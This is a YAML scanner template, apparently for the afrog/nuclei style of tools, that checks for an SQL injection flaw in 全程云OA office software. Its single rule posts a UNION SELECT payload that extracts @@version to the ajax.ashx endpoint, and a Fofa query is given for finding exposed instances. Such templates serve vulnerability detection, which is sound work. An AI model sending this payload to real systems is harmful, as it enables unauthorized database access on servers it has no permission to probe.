id: eqccd-oa-mod-ajax-sqli

info:
  name: 全程云OA SQL注入漏洞
  author: zan8in
  severity: high
  verified: true
  description: |-
    全程云OA中存在SQL注入漏洞
    Fofa: "全程云OA" || "images/yipeoplehover.png"
  reference:
    - https://mp.weixin.qq.com/s/Gr-5nLv9tP_tkj_JR1Q-Mg
  tags: eqccd,sqli
  created: 2024/01/08

rules:
  r0:
    request:
      method: POST
      path: /OA/common/mod/ajax.ashx
      body: dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=1 UNION ALL SELECT 1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 -- A
    expression: |
      response.status == 200 && 
      response.body.ibcontains(b'"PK_ID":') && 
      response.body.ibcontains(b'"sCode":') && 
      response.body.ibcontains(b'sql server')
expression: r0()